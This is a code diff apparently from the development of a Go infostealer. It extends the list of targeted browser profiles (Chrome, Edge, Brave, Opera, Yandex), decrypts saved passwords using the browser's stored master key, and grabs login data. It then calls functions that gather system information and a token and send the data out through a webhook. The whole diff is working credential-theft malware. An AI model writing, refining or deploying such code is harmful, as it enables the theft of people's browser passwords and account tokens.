@@ -35,7 +35,7 @@ type Login struct {
 var masterKey []byte
 var passwordFile string
 var pwCount int
-var LoginPaths = []string{"\\Default\\Login Data", "\\Profile 1\\Login Data", "\\Profile 2\\Login Data", "\\Profile 3\\Login Data", "\\Profile 4\\Login Data", "\\Profile 5\\Login Data", "\\Profile 6\\Login Data", "\\Profile 7\\Login Data", "\\Profile 8\\Login Data", "\\Profile 9\\Login Data", "\\Profile 10\\Login Data"}
+var LoginPaths = []string{"\\Opera Software\\Opera GX Stable", "\\Opera Software\\Opera Stable", "\\Opera Software\\Opera Neon\\User Data\\Default", "\\Google\\Chrome\\User Data", "\\Google\\Chrome SxS\\User Data", "\\BraveSoftware\\Brave-Browser\\User Data", "\\Yandex\\YandexBrowser\\User Data", "\\Microsoft\\Edge\\User Data",    }
 var gpu string
 var mCpu string
 //var memory float64
@@ -246,9 +246,10 @@ func TargetInformation(){
 
 
 var secretKey []byte
-var LocalStatePath string = strings.Replace(os.Getenv("APPDATA") + "\\Google\\Chrome\\User Data", "Roaming", "Local", -1)
+var LocalStatePath string = strings.Replace(os.Getenv("APPDATA"), "Roaming", "Local", -1)
+//C:\Users\User\AppData\Local\Google\Chrome\User Data
 func getMasterKey() ([]byte) {
-	data, err := ioutil.ReadFile(LocalStatePath + "\\Local State")
+	data, err := ioutil.ReadFile(LocalStatePath + "\\Google\\Chrome\\User Data\\Local State")
 
 	if err != nil{}
 
@@ -292,7 +293,7 @@ func DecryptPassword(buff []byte, masterKey []byte) string {
 
 
 
-func ChromeCrackLogin(path string) ([]Login, error){
+func CrackLogin(path string) ([]Login, error){
 	var credentials []Login
 	db, err := sql.Open("sqlite3", path)
 	if err != nil {
@@ -326,12 +327,12 @@ func Grabber() {
 	masterKey = key
 
     for _, path := range LoginPaths {
-		Path := LocalStatePath + path
+		Path := LocalStatePath + path + "\\Login Data"
 
 		_, err := os.Stat(Path)
 		
 		if err == nil {
-			logins, err := ChromeCrackLogin(Path)
+			logins, err := CrackLogin(Path)
 			if err != nil{}
 			for _, cred := range logins{
 				pwCount += 1
@@ -353,6 +354,7 @@ Password: %s
 
 
 func main(){
+	TargetInformation()
 	Grabber()
 	GetToken()
 	SendWebHook()
